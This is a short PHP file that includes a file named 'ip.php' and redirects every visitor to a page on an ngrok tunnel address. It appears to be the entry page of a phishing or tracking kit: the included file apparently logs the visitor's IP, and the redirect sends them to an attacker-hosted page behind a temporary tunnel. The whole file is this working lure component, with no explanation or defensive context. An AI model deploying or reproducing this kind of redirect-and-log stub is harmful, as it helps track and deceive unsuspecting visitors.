<?php
include 'ip.php';
header('Location: https://5d77-2409-4042-49a-6ffb-24b-b762-ecef-2f00.ngrok.io/index2.html');
exit
?>
